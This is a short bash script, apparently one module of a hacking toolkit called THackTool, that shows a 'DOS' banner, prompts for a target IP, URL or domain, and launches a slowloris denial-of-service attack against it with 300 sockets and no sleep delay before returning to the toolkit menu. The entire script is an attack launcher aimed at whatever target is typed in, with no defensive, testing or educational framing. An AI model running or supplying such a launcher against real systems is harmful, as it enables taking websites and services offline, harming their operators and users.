clear
figlet DOS
echo
read -p "Target IP/URL/Domain: " target
slowloris -s 300 --sleeptime 0 $target
echo
read -p "!Press Enter to return to main menu!"
bash ~/THackTool/start.sh
